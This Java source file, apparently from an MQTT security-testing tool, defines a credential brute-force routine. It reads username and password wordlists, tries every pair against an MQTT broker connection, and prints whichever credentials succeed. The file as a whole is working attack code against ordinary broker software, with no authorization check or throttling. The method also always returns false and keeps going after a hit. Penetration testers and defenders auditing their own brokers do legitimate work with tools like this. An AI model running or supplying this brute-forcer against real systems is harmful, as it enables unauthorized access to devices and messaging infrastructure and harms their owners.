package vink.mqttshield.routines;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import org.bouncycastle.crypto.modes.gcm.GCMExponentiator;
import org.eclipse.paho.client.mqttv3.MqttClient;
import org.eclipse.paho.client.mqttv3.MqttException;

import vink.mqttshield.core.ConnOpts;

public class UserPassBruteForce {

    private List<String> usernames = null;
    private List<String> passwords = null;
    public UserPassBruteForce(){
        this.usernames = lineReader("usernames.txt");
        this.passwords = lineReader("passwords.txt");

    }
    private List<String> lineReader(String file) {
        List<String> lines = new ArrayList<>();
        try {
            InputStream iStream = getClass().getClassLoader().getResourceAsStream(file);
            BufferedReader bReader = new BufferedReader(new InputStreamReader(iStream));
            String line;
            while ((line = bReader.readLine()) != null) {
                line = line.trim();
                if (line.length() > 0) {
                    lines.add(line);
                }               
            }
            bReader.close();
        } catch (Exception e) {
            System.out.println("Error while reading file " + e.getMessage());
        }    
        return lines;
    }

    public boolean tryBruteForce(MqttClient client) {
        for ( String user : usernames ){
            for ( String pass : passwords ){
                ConnOpts opts = new ConnOpts(user , pass);
                try {
                    client.connect(opts.getOpts());
                    System.out.println("Found Valid creds " + user + " : " + pass);
                    client.disconnect();
                } catch (MqttException e) {
                    //do nothing
                }
            }
        }
        return false;
        
    }

}
